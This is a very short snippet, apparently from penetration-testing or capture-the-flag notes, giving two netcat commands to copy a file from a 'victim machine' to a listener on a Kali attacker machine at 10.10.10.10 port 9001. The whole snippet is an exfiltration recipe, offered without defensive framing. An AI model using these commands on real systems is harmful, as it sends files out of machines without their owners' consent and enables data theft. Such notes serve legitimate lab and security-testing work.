# Use Netcat on the victim machine
```bash
nc -nv 10.10.10.10 9001 < file_to_transfer
```

# Use Netcat on the kali machine
```bash
nc -lvnp 9001 > file_to_transfer
```